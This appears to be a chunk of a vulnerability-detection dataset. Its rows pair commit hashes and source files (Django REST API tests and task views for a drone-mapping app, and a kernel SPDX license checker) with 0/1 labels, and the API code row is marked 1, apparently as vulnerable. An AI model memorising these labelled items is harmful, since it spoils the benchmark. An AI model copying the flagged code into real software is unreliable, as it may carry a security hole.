        self.assertEqual(res.status_code, status.HTTP_201_CREATED)
        self.assertTrue(Project.objects.get(pk=res.data['id']).owner.id == user.id)

        # Cannot leave name empty
        res = client.post('/api/projects/', {'description': 'test descr'})
        self.assertEqual(res.status_code, status.HTTP_400_BAD_REQUEST)


        # Create some tasks
        task = Task.objects.create(project=project)
        task2 = Task.objects.create(project=project, created_at=task.created_at + datetime.timedelta(0, 1))
        other_task = Task.objects.create(project=other_project)

        # Can list project tasks to a project we have access to
        res = client.get('/api/projects/{}/tasks/'.format(project.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 2)

        # Can sort
        res = client.get('/api/projects/{}/tasks/?ordering=created_at'.format(project.id))
        self.assertTrue(res.data[0]['id'] == task.id)
        self.assertTrue(res.data[1]['id'] == task2.id)

        res = client.get('/api/projects/{}/tasks/?ordering=-created_at'.format(project.id))
        self.assertTrue(res.data[0]['id'] == task2.id)
        self.assertTrue(res.data[1]['id'] == task.id)

        # Cannot list project tasks for a project we don't have access to
        res = client.get('/api/projects/{}/tasks/'.format(other_project.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Cannot list project tasks for a project that doesn't exist
        res = client.get('/api/projects/999/tasks/')
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)
        
        # Can list task details for a task belonging to a project we have access to
        res = client.get('/api/projects/{}/tasks/{}/'.format(project.id, task.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data[""id""] == task.id)

        # images_count field exists
        self.assertTrue(res.data[""images_count""] == 0)

        # Get console output
        res = client.get('/api/projects/{}/tasks/{}/output/'.format(project.id, task.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data == """")

        task.console_output = ""line1\nline2\nline3""
        task.save()

        res = client.get('/api/projects/{}/tasks/{}/output/'.format(project.id, task.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data == task.console_output)

        # Console output with line num
        res = client.get('/api/projects/{}/tasks/{}/output/?line=2'.format(project.id, task.id))
        self.assertTrue(res.data == ""line3"")

        # Console output with line num out of bounds
        res = client.get('/api/projects/{}/tasks/{}/output/?line=3'.format(project.id, task.id))
        self.assertTrue(res.data == """")
        res = client.get('/api/projects/{}/tasks/{}/output/?line=-1'.format(project.id, task.id))
        self.assertTrue(res.data == task.console_output)

        # Cannot list task details for a task belonging to a project we don't have access to
        res = client.get('/api/projects/{}/tasks/{}/'.format(other_project.id, other_task.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # As above, but by trying to trick the API by using a project we have access to
        res = client.get('/api/projects/{}/tasks/{}/'.format(project.id, other_task.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Cannot access task details for a task that doesn't exist
        res = client.get('/api/projects/{}/tasks/999/'.format(project.id, other_task.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can update a task
        res = client.patch('/api/projects/{}/tasks/{}/'.format(project.id, task.id), {'name': 'updated!'}, format='json')
        self.assertEqual(res.status_code, status.HTTP_200_OK)

        # Verify the task has been updated
        res = client.get('/api/projects/{}/tasks/{}/'.format(project.id, task.id))
        self.assertTrue(res.data[""name""] == ""updated!"")

        # Cannot update a task we have no access to
        res = client.patch('/api/projects/{}/tasks/{}/'.format(other_project.id, other_task.id), {'name': 'updated!'}, format='json')
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can cancel a task for which we have permission
        self.assertTrue(task.pending_action is None)
        res = client.post('/api/projects/{}/tasks/{}/cancel/'.format(project.id, task.id))
        self.assertTrue(res.data[""success""])
        task.refresh_from_db()
        self.assertTrue(task.last_error is None)
        self.assertTrue(task.pending_action == pending_actions.CANCEL)

        res = client.post('/api/projects/{}/tasks/{}/restart/'.format(project.id, task.id))
        self.assertTrue(res.data[""success""])
        task.refresh_from_db()
        self.assertTrue(task.last_error is None)
        self.assertTrue(task.pending_action == pending_actions.RESTART)

        # Cannot cancel, restart or delete a task for which we don't have permission
        for action in ['cancel', 'remove', 'restart']:
            res = client.post('/api/projects/{}/tasks/{}/{}/'.format(other_project.id, other_task.id, action))
            self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can delete
        res = client.post('/api/projects/{}/tasks/{}/remove/'.format(project.id, task.id))
        self.assertTrue(res.data[""success""])
        task.refresh_from_db()
        self.assertTrue(task.last_error is None)
        self.assertTrue(task.pending_action == pending_actions.REMOVE)


        # TODO test:
        # - tiles.json requests
        # - task creation via file upload
        # - scheduler processing steps
        # - tiles API urls (permissions, 404s)
        # - assets download (aliases)
        # - assets raw downloads
        # - project deletion

    def test_processingnodes(self):
        client = APIClient()

        pnode = ProcessingNode.objects.create(
                hostname=""localhost"",
                port=999
            )

        another_pnode = ProcessingNode.objects.create(
            hostname=""localhost"",
            port=998
        )

        # Cannot list processing nodes as guest
        res = client.get('/api/processingnodes/')
        self.assertEqual(res.status_code, status.HTTP_403_FORBIDDEN)

        res = client.get('/api/processingnodes/{}/'.format(pnode.id))
        self.assertEqual(res.status_code, status.HTTP_403_FORBIDDEN)

        client.login(username=""testuser"", password=""test1234"")

        # Cannot list processing nodes, unless permissions have been granted
        res = client.get('/api/processingnodes/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 0)

        user = User.objects.get(username=""testuser"")
        self.assertFalse(user.is_staff)
        self.assertFalse(user.is_superuser)
        self.assertFalse(user.has_perm('view_processingnode', pnode))
        assign_perm('view_processingnode', user, pnode)
        self.assertTrue(user.has_perm('view_processingnode', pnode))

        # Now we can list processing nodes as normal user
        res = client.get('/api/processingnodes/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 1)
        self.assertTrue(res.data[0][""hostname""] == ""localhost"")

        # Can use filters
        res = client.get('/api/processingnodes/?id={}'.format(pnode.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 1)

        res = client.get('/api/processingnodes/?id={}'.format(another_pnode.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 0)

        # Can filter nodes with valid options
        res = client.get('/api/processingnodes/?has_available_options=true')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 0)

        res = client.get('/api/processingnodes/?has_available_options=false')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 1)
        self.assertTrue(res.data[0]['hostname'] == 'localhost')


        # Can get single processing node as normal user
        res = client.get('/api/processingnodes/{}/'.format(pnode.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data[""hostname""] == ""localhost"")


        # Cannot delete a processing node as normal user
        res = client.delete('/api/processingnodes/{}/'.format(pnode.id))
        self.assertTrue(res.status_code, status.HTTP_403_FORBIDDEN)

        # Cannot create a processing node as normal user
        res = client.post('/api/processingnodes/', {'hostname': 'localhost', 'port':'1000'})
        self.assertTrue(res.status_code, status.HTTP_403_FORBIDDEN)

        client.login(username=""testsuperuser"", password=""test1234"")

        # Can delete a processing node as super user
        res = client.delete('/api/processingnodes/{}/'.format(pnode.id))
        self.assertTrue(res.status_code, status.HTTP_200_OK)

        # Can create a processing node as super user
        res = client.post('/api/processingnodes/', {'hostname': 'localhost', 'port':'1000'})
        self.assertTrue(res.status_code, status.HTTP_200_OK)

        # Verify node has been created
        res = client.get('/api/processingnodes/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 2)
        self.assertTrue(res.data[1][""port""] == 1000)

/n/n/n",0
219,7530515f25d8f5a2a1e1e2b2d6d8fc9d711f730a,"/app/api/common.py/n/nfrom django.core.exceptions import ObjectDoesNotExist
from rest_framework import exceptions

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """"""
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """"""
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }/n/n/n/app/api/tasks.py/n/nimport mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """"""
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """"""
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """"""
        Retrieve the console output for this task.
        An optional ""line"" query param can be passed to retrieve
        only the output starting from a certain line number.
        """"""
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or """"
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({""id"": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail=""Cannot create task, input provided is not valid."")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="""", x="""", y=""""):
        """"""
        Get an orthophoto tile
        """"""
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, ""rb"")
            return HttpResponse(FileWrapper(tile), content_type=""image/png"")
        else:
            raise exceptions.NotFound()


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """"""
        Get tile.json for this tasks's orthophoto
        """"""
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast(""orthophoto"", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


class TaskAssets(TaskNestedView):
        def get(self, request, pk=None, project_pk=None, asset=""""):
            """"""
            Downloads a task asset (if available)
            """"""
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound(""Asset does not exist"")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, ""rb"")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or ""application/zip""))
                response['Content-Disposition'] = ""attachment; filename={}"".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()/n/n/n/app/api/urls.py/n/nfrom django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),

    url(r'^auth/', include('rest_framework.urls')),
]/n/n/n",1
220,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""deprecated"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",0
221,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"/scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
